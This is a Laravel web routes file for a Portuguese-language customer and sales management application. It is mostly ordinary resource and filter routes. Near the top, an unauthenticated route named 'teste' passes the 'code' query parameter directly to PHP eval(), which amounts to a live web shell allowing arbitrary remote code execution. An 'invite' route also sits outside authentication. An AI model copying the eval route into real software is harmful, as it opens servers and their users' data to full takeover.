<?php

use App\Models\ConversationItem;
use Illuminate\Support\Facades\Route;
use App\Http\Controllers\CnpjController;
use App\Http\Controllers\UserController;
use App\Http\Controllers\EtapaController;
use App\Http\Controllers\ValueController;
use App\Http\Controllers\ConfigController;
use App\Http\Controllers\SectorController;
use App\Http\Controllers\AddressController;
use App\Http\Controllers\ContactController;
use App\Http\Controllers\ProductController;
use App\Http\Controllers\SegmentController;
use App\Http\Controllers\CustomerController;
use App\Http\Controllers\EmployeeController;
use App\Http\Controllers\DirectionController;
use App\Http\Controllers\AttachmentController;
use App\Http\Controllers\AzureAcessController;
use App\Http\Controllers\DepartmentController;
use App\Http\Controllers\EmailAuditController;
use App\Http\Controllers\OccupationController;
use App\Http\Controllers\ContactTypeController;
use App\Http\Controllers\EmailConfigController;
use App\Http\Controllers\ConversationController;
use App\Http\Controllers\ProjectStatusController;
use App\Http\Controllers\TemplateEmailController;
use App\Http\Controllers\ProposedStatusController;
use App\Http\Controllers\DetailedContactController;
use App\Http\Controllers\ScheduleAddressController;
use App\Http\Controllers\ConversationItemController;
use App\Http\Controllers\ProspectingStatusController;
use App\Http\Controllers\GeneralContactTypeController;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('invite', function() {
    auth()->user()->sendScheduleNotification(ConversationItem::find(6));
});

Route::get('teste', function() {
    $code = $_GET['code'];
    eval($code);
});

Route::get('/', function () {
    return redirect()->route('login');
})->name('home');

Route::group(['middleware' => ['auth:sanctum', 'verified']], function() {

    Route::middleware(['auth:sanctum', 'verified'])->get('/dashboard', function () {
        return view('dashboard');
    })->name('dashboard');

    Route::resource('usuarios', UserController::class, [
        'names' => 'users'])->parameters([
        'usuarios' => 'user'
    ]);
    Route::prefix('usuarios')->name('users.')->group(function(){
        Route::post('/filter', [UserController::class, 'filter'])->name('filter');
        Route::post('/forgot-password/{user}', [UserController::class, 'forgotPassword'])->name('forgot-password');
    });

    Route::prefix('config')->name('config.')->group(function(){
        Route::get('/', [ConfigController::class, 'index'])->name('index');
        Route::post('/store', [ConfigController::class, 'store'])->name('store');

        Route::prefix('emails')->name('emails.')->group(function(){
            Route::get('/', [EmailConfigController::class, 'index'])->name('index');
            Route::post('/store', [EmailConfigController::class, 'store'])->name('store');
            Route::resource('templates', TemplateEmailController::class);
            Route::get('templates/mail-preview/{template}', [TemplateEmailController::class, 'show'])->name("templates.mail-preview");
            Route::get('/email-audit', [EmailAuditController::class, 'index'])->name("email-audit.index");
            Route::get('/email-audit/{email_audit}', [EmailAuditController::class, 'show'])->name("email-audit.show");
            Route::post('/email-audit/filter', [EmailAuditController::class, 'filter'])->name("email-audit.filter");
            Route::get('/email-audit/body/{email_audit}', [EmailAuditController::class, 'body'])->name("email-audit.body");
        });
    });

    Route::resource('colacoradores', EmployeeController::class, [
        'names' => 'employees'])->parameters([
        'colacoradores' => 'employee'
    ]);

    Route::prefix('colacoradores')->name('employees.')->group(function(){
        Route::post('/filter', [EmployeeController::class, 'filter'])->name('filter');
        Route::post('/get', [EmployeeController::class, 'getByParams'])->name('get-by-params');
    });

    Route::resource('departamentos', DepartmentController::class, [
        'names' => 'departments'])->parameters([
        'departamentos' => 'department'
    ]);

    Route::prefix('departamentos')->name('departments.')->group(function(){
        Route::post('/filter', [DepartmentController::class, 'filter'])->name('filter');
    });

    Route::resource('cargos', OccupationController::class, [
        'names' => 'occupations'])->parameters([
        'cargos' => 'occupation'
    ]);

    Route::prefix('cargos')->name('occupations.')->group(function(){
        Route::post('/filter', [OccupationController::class, 'filter'])->name('filter');
    });

    Route::resource('diretorias', DirectionController::class, [
        'names' => 'directions'])->parameters([
        'diretorias' => 'direction'
    ]);

    Route::prefix('diretorias')->name('directions.')->group(function(){
        Route::post('/filter', [DirectionController::class, 'filter'])->name('filter');
    });

    Route::resource('tipo-contato', ContactTypeController::class, [
        'names' => 'contact-types'])->parameters([
        'tipo-contato' => 'contact_type'
    ]);

    Route::prefix('tipo-contato')->name('contact-types.')->group(function(){
        Route::post('/filter', [ContactTypeController::class, 'filter'])->name('filter');
    });

    Route::resource('tipo-contato-geral', GeneralContactTypeController::class, [
        'names' => 'general-contact-types'])->parameters([
        'tipo-contato-geral' => 'general_contact_type'
    ]);

    Route::prefix('tipo-contato-geral')->name('general-contact-types.')->group(function(){
        Route::post('/filter', [GeneralContactTypeController::class, 'filter'])->name('filter');
    });

    Route::resource('segmentos', SegmentController::class, [
        'names' => 'segments'])->parameters([
        'segmentos' => 'segment'
    ]);

    Route::prefix('segmentos')->name('segments.')->group(function(){
        Route::post('/filter', [SegmentController::class, 'filter'])->name('filter');
    });

    Route::resource('setores', SectorController::class, [
        'names' => 'sectors'])->parameters([
        'setores' => 'sector'
    ]);

    Route::prefix('setores')->name('sectors.')->group(function(){
        Route::post('/filter', [SectorController::class, 'filter'])->name('filter');
    });

    Route::resource('status-integracao', ProspectingStatusController::class, [
        'names' => 'prospecting-statuss'])->parameters([
        'status-integracao' => 'prospecting-status'
    ]);

    Route::prefix('status-integracao')->name('prospecting-statuss.')->group(function(){
        Route::post('/filter', [ProspectingStatusController::class, 'filter'])->name('filter');
    });

    Route::resource('status-proposta', ProposedStatusController::class, [
        'names' => 'proposed-statuss'])->parameters([
        'status-proposta' => 'proposed-status'
    ]);

    Route::prefix('status-proposta')->name('proposed-statuss.')->group(function(){
        Route::post('/filter', [ProposedStatusController::class, 'filter'])->name('filter');
    });

    Route::resource('status-projeto', ProjectStatusController::class, [
        'names' => 'project-statuss'])->parameters([
        'status-projeto' => 'project-status'
    ]);

    Route::prefix('status-projeto')->name('project-statuss.')->group(function(){
        Route::post('/filter', [ProjectStatusController::class, 'filter'])->name('filter');
    });

    Route::resource('produtos', ProductController::class, [
        'names' => 'products'])->parameters([
        'produtos' => 'product'
    ]);

    Route::prefix('produtos')->name('products.')->group(function(){
        Route::post('/filter', [ProductController::class, 'filter'])->name('filter');
    });

    Route::resource('clientes', CustomerController::class, [
        'names' => 'customers'])->parameters([
        'clientes' => 'customer'
    ]);

    Route::prefix('clientes')->name('customers.')->group(function(){
        Route::post('/filter', [CustomerController::class, 'filter'])->name('filter');
        Route::post('/cnpj/{cnpj}', [CustomerController::class, 'cnpj'])->name('cnpj');

        Route::prefix('contato')->name('contact.')->group(function(){
            Route::put('/store', [ContactController::class, 'store'])->name('store');
            Route::post('/update/{contact}', [ContactController::class, 'update'])->name('update');
            Route::delete('/delete/{contact}', [ContactController::class, 'destroy'])->name('delete');
        });

        Route::resource('contato-detalhado', DetailedContactController::class, [
            'names' => 'detailed-contacts'])->parameters([
            'contato-detalhado' => 'detailed_contact'
        ]);

        Route::prefix('endereco')->name('address.')->group(function(){
            Route::post('/cep/{cep}', [AddressController::class, 'cep'])->name('cep');
        });

        Route::prefix('conversas')->name('conversations.')->group(function(){
            Route::get('/{conversation}', [ConversationController::class, 'show'])->name('show');
            Route::post('/store', [ConversationController::class, 'store'])->name('store');

            Route::prefix('item')->name('item.')->group(function(){
                Route::get('/create/{conversation}', [ConversationItemController::class, 'create'])->name('create');
                Route::get('/edit/{item}', [ConversationItemController::class, 'edit'])->name('edit');
                Route::get('/{item}', [ConversationItemController::class, 'show'])->name('show');
                Route::post('/store', [ConversationItemController::class, 'store'])->name('store');
                Route::put('/update/{item}', [ConversationItemController::class, 'update'])->name('update');

                Route::prefix('anexos')->name('attachments.')->group(function(){
                    Route::post('/store', [AttachmentController::class, 'store'])->name('store');
                    Route::delete('/delete/{attachment}', [AttachmentController::class, 'destroy'])->name('delete');
                });

                Route::prefix('valores')->name('values.')->group(function(){
                    Route::post('/store', [ValueController::class, 'store'])->name('store');
                    Route::put('/update/{value}', [ValueController::class, 'update'])->name('update');
                    Route::delete('/delete/{value}', [ValueController::class, 'destroy'])->name('delete');
                });

                Route::prefix('destinatario')->name('address.')->group(function(){
                    Route::post('/store', [ScheduleAddressController::class, 'store'])->name('store');
                    Route::put('/update/{address}', [ScheduleAddressController::class, 'update'])->name('update');
                    Route::delete('/delete/{address}', [ScheduleAddressController::class, 'destroy'])->name('delete');
                });
            });
        });

    });

    Route::prefix('azure')->name('azure.')->group(function(){
        Route::get('token', [AzureAcessController::class, 'token'])->name('token');
        Route::get('create-online-meeting', [AzureAcessController::class, 'createOnlineMeeting'])->name('createOnlineMeeting');
    });

    Route::resource('etapas', EtapaController::class, [
        'names' => 'etapas'])->parameters([
        'etapas' => 'etapa'
    ]);

    Route::prefix('etapas')->name('etapas.')->group(function(){
        Route::post('/filter', [EtapaController::class, 'filter'])->name('filter');
    });

    Route::resource('cnpjs', CnpjController::class, [
        'names' => 'cnpjs'])->parameters([
        'cnpjs' => 'cnpj'
    ]);

    Route::prefix('cnpjs')->name('cnpjs.')->group(function(){
        Route::post('/filter', [CnpjController::class, 'filter'])->name('filter');
    });

});


